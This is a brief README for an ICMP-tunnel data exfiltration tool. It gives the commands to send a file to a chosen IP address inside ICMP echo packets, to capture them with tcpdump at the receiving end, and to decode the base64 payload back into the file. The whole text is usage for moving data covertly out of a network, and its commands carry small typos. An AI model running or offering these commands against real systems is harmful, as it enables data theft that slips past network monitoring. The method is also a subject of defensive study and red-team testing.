# Data Ex-filteration over ICMP Tunnel

### Usage:

at the client end:

```python icmp_transmitter.py  "input_file_to_be_sent" "IP_address_to_be_sent"```

at the server end:
 
run tcpdump. Use the following command :

```sudo tcpdump -i eth0 icmp and icmp[icmptype]=icmp-echo -XX -vvv -w output.txt```

Use icmptofile.py to decode the base64 data to respective format

```python icmptofile.py output,txt"```

